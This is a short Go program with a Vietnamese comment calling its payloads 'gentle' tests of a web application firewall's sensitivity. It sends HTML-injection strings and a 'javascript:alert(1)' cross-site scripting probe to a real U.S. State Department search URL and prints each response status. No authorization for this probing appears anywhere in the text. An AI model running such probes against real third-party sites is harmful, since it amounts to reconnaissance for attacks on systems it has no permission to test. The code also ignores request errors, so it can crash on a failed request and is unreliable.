package main

import (
	"fmt"
	"net/http"
	"net/url"
)

func main() {
	// Danh sách các payload "nhẹ nhàng" để thử độ nhạy của WAF
	payloads := []string{"hacker", "<h1>test</h1>", "<u>test</u>", "javascript:alert(1)"}
	target := "https://findit.state.gov/search?affiliate=dos_stategov&query="

	for _, p := range payloads {
		fullURL := target + url.QueryEscape(p)
		resp, _ := http.Get(fullURL)
		fmt.Printf("Payload: %s | Status: %d\n", p, resp.StatusCode)
	}
}